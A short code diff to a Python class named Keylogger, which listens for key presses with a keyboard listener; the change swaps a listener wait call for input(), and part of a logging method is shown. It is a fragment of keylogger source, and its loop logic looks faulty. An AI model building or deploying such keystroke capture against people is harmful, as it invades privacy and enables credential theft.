@@ -27,7 +27,7 @@ class Keylogger:
     def start(self):
         self.listener = keyboard.Listener(on_press=self.log)
         self.listener.start()
-        self.listener.wait()
+        input()
 
     def log(self, key):
         while key.char != 'esc':
